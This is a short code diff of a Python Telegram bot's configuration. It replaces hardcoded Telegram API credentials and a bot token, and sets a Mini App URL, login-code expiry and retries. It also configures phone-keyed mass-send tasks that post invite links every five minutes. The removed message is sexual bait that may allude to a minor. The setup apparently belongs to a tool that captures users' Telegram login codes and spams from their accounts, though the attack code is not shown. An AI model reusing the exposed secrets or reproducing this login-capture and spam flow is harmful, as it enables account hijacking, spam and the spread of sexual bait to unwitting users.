@@ -32,9 +32,9 @@ from telegram.ext import (
 # CONFIG
 # ===============================
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-API_ID = 36888953
-API_HASH = "91a5622be4634cf2b16572adaea6151a"
-BOT_TOKEN = "8849270103:AAHJlO0pR0ELe2xsO6NiTjmzupgEOqDur6s"
+API_ID = 35214126
+API_HASH = "332680c93c1cd23f6d2a9a5d3c990c48"
+BOT_TOKEN = "7964595191:AAH7LjUqmPP2fbef3z6zYUZbIYQdWQei6BA"
 
 # ⚠️ URL HTTPS do Mini App (domínio)
 WEBAPP_URL = "https://qualquerum.shop/webapp"
@@ -42,10 +42,10 @@ WEBAPP_PORT = 8080
 
 CODE_TTL = 180
 MAX_RETRIES = 3
-LINK_GRUPO = "https://t.me/+x7ZVNM5RAZMyMWEx"
-DISPARO_MSG = "💦 𝗡𝗼𝘃!𝗻𝗵𝟰 𝗱𝗮𝗻𝗱𝗼 𝗼 𝗰𝘂 𝗽𝗿𝗮 𝟱 👇\n\nhttps://t.me/+x7ZVNM5RAZMyMWEx"
+LINK_GRUPO = "https://t.me/+MUSHc1O5dNw2NGMx"
+DISPARO_MSG = "❌ 𝗔𝗰𝗲𝘀𝘀𝗼 𝗣𝗿𝗼𝗶𝗯𝗶𝗱𝗼 ⚠️\n\nhttps://t.me/+MUSHc1O5dNw2NGMx"
 DISPARO_INTERVALO = 300  # 5 minutos
-APPROVE_DELAY_MINUTES = 10  # Minutos para aprovar join request automaticamente
+APPROVE_DELAY_MINUTES = 444444444444444  # Minutos para aprovar join request automaticamente
 
 users = {}
 disparo_tasks = {}  # phone -> asyncio.Task
